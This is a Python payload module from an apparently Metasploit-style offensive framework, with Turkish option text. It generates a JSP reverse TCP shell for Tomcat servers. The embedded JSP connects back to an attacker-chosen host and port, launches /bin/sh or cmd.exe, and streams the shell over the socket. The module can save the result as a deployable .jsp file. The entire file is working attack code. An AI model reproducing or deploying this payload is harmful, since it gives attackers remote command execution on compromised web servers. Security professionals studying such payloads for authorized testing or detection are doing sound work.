from core.module import BaseModule
from core.option import Option
from typing import Dict, Any

class Payload(BaseModule):
    Name = "java/jsp_reverse_tcp"
    Description = "JSP Reverse TCP Shell (Tomcat)."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LHOST": Option("LHOST", "127.0.0.1", True, "Dinleyen IP."),
            "LPORT": Option("LPORT", 4444, True, "Dinleyen Port."),
            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: shell.jsp).", completion_dir=".")
        }

    def generate(self) -> str:
        lhost = self.get_option_value("LHOST")
        lport = self.get_option_value("LPORT")

        # Basic JSP Reverse Shell
        payload = f"""
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%
  class StreamConnector extends Thread {{
    InputStream wz;
    OutputStream yr;
    StreamConnector(InputStream wz, OutputStream yr) {{
      this.wz = wz;
      this.yr = yr;
    }}
    public void run() {{
      BufferedReader kgb = null;
      BufferedWriter cyp = null;
      try {{
        kgb = new BufferedReader(new InputStreamReader(this.wz));
        cyp = new BufferedWriter(new OutputStreamWriter(this.yr));
        char buffer[] = new char[8192];
        int length;
        while ((length = kgb.read(buffer, 0, buffer.length)) > 0) {{
          cyp.write(buffer, 0, length);
          cyp.flush();
        }}
      }} catch (Exception e) {{}}
      try {{
        if (kgb != null) kgb.close();
        if (cyp != null) cyp.close();
      }} catch (Exception e) {{}}
    }}
  }}
  try {{
    String ShellPath;
    if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {{
      ShellPath = new String("/bin/sh");
    }} else {{
      ShellPath = new String("cmd.exe");
    }}
    Socket socket = new Socket("{lhost}", {lport});
    Process process = Runtime.getRuntime().exec(ShellPath);
    (new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();
    (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
  }} catch (Exception e) {{}}
%>
"""
        return payload.strip()

    def run(self, options: Dict[str, Any]):
        code = self.generate()
        
        output_path = self.get_option_value("OUTPUT")
        if output_path:
            if not output_path.endswith(".jsp"):
                output_path += ".jsp"

            try:
                with open(output_path, "w") as f:
                    f.write(code)
                print(f"[*] JSP Payload oluşturuldu ({len(code)} bytes):")
                print(f"[*] Kaydedildi: {output_path}")
                return f"Payload saved to {output_path}"
            except Exception as e:
                print(f"[!] Dosya yazma hatası: {e}")
                return code

        print(f"[*] JSP Payload oluşturuldu ({len(code)} bytes):")
        print("-" * 50)
        print(code)
        print("-" * 50)
        return code
